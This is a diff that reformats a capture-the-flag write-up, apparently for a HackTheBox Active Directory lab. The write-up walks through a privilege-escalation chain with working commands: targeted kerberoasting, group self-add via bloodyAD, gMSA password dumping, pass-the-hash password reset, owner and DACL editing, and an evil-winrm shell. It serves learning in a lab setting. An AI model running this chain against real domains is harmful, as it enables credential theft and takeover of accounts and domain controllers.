@@ -208,7 +208,8 @@ So the full attack chain will be as follows:
 
 ### Abusing ACE Permissions
 
-1. Let’s start by abusing the WriteSPN permission that Henry has over Alfred by performing a targeted kerberoasting attack using `targetedKerberoast.py`:
+#### 1. Targeted Kerberoasting (Henry ➔ Alfred)
+Let’s start by abusing the WriteSPN permission that Henry has over Alfred by performing a targeted kerberoasting attack using `targetedKerberoast.py`:
 
 ```bash
 $ python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!' --request-user Alfred
@@ -245,14 +246,16 @@ SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\alfred:b
 
 They work.
 
-1. Next, let’s abuse the AddSelf permission to add Alfred to the Infrastructure group, through the usage of `bloodyAD`:
+#### 2. Group Membership Abuse via AddSelf (Alfred ➔ Infrastructure)
+Next, let’s abuse the AddSelf permission to add Alfred to the Infrastructure group, through the usage of `bloodyAD`:
 
 ```bash
 $ bloodyAD -u 'Alfred' -p 'bas<REDACTED>' -d tombwatcher.htb --host 10.129.232.167 add groupMember 'Infrastructure' Alfred   
 [+] Alfred added to Infrastructure
 ```
 
-1. Now as part of the Infrastructure group, let’s read the GMSA password of the Ansible_dev$ account through using `gMSADumper.py`:
+#### 3. Reading gMSA Credentials (Infrastructure ➔ Ansible_dev$)
+Now as part of the Infrastructure group, let’s read the GMSA password of the Ansible_dev$ account through using `gMSADumper.py`:
 
 ```bash
 $ python3 gMSADumper.py -u 'Alfred' -p 'bas<REDACTED>' -d 'tombwatcher.htb'                                               
@@ -281,7 +284,8 @@ Session completed.
 
 So the hash wasn’t successfully cracked, yet we can still use it in Pass-the-Hash attacks.
 
-1. Let’s now abuse the ForceChangePassword permission by the Ansible_dev$ account to change the password of Sam, using `pth-net`:
+#### 4. Account ForceChangePassword Abuse (Ansible_dev$ ➔ Sam)
+Let’s now abuse the ForceChangePassword permission by the Ansible_dev$ account to change the password of Sam, using `pth-net`:
 
 ```bash
 $ pth-net rpc password "Sam" "sam123456" -U tombwatcher.htb/'ansible_dev$'%'ffffffffffffffffffffffffffffffff':'bf8b11<REDACTED>' -S 10.129.232.167
@@ -299,7 +303,8 @@ SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\sam:sam1
 
 Success!
 
-1. Now with Sam under our control, let’s abuse the WriteOwner permission to change the owner of the user John to be us (Sam), and give ourself GenericAll permission over John to change its password.
+#### 5. Object Ownership & DACL Abuse (Sam ➔ John)
+Now with Sam under our control, let’s abuse the WriteOwner permission to change the owner of the user John to be us (Sam), and give ourself GenericAll permission over John to change its password.
 
 First, let’s change the owner using `impacket-owneredit`:
 
@@ -341,7 +346,8 @@ SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\john:joh
 
 Success!
 
-1. Now after all of this, and with John being part of the Remote Management Users group, let’s use `evil-winrm` to gain a shell over the DC, where `user.txt` will be awaiting:
+#### 6. Initial Shell & User Flag via evil-winrm
+Now after all of this, and with John being part of the Remote Management Users group, let’s use `evil-winrm` to gain a shell over the DC, where `user.txt` will be awaiting:
 
 ```bash
 $ evil-winrm -u John -p john123456 -i dc01.tombwatcher.htb                        
